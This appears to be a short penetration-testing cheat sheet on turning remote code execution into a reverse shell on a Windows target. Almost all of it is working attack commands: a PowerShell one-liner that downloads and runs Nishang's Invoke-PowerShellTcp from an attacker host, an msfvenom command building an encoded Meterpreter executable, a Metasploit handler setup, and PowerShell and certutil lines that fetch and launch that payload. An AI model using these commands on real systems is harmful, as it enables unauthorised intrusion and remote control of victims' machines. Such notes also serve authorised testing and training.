The following repository contains some scripts for initial access, enumeration and privilege escalation.

```
https://github.com/samratashok/nishang
```

We will start by downloading the following reverse shell:

```
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```

Then, we will start a python server to serve the file, and we will make the target download it and execute it (using RCE):

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<attacker-ip>:<http-server-port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <attacker-ip> -Port <reverse-shell-port>
```

or we could simply use powershell encoded reverse shell or any other shell from the following link:

```
https://www.revshells.com/
```

# Meterpreter Shell
To generate a x86 meterpreter encoded reverse shell we could use the following command:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell.exe
```

Then, we start a handler on Metasploit:

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
run
```

Now we download the file on the target (using RCE) and run it:

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell.exe','shell.exe')";powershell Start-Process "shell.exe"
# Or we could use this
certutil -urlcache -split -f http://10.21.25.103:8000/shell.exe shell.exe
```